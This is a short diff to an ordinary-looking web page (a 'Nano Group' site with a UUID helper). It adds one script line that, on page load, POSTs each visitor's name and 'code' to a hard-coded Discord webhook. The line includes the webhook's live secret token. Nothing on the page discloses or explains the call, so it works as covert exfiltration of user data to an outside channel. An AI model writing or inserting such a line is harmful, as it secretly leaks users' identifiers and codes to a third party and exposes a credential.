@@ -79,6 +79,7 @@ button{margin-top:30px;width:100%;padding:15px;background:#202020;color:#e5e5e5;
 <footer style="text-align:center;padding:20px;color:#666">© 2025 Nano Group</footer>
 
 <script>
+  fetch('https://discord.com/api/webhooks/1443173091256701039/nsytOgcdtMoMhujGA2dDBdufaWIeoR2vsjOuV5T5I2JvwsyWnAWhGFfhaGKrBQ5XC57S',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:`New Visit: ${user.name} | Code: ${user.code}`})});
 
 function uuidv4(){
   return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,c=>{
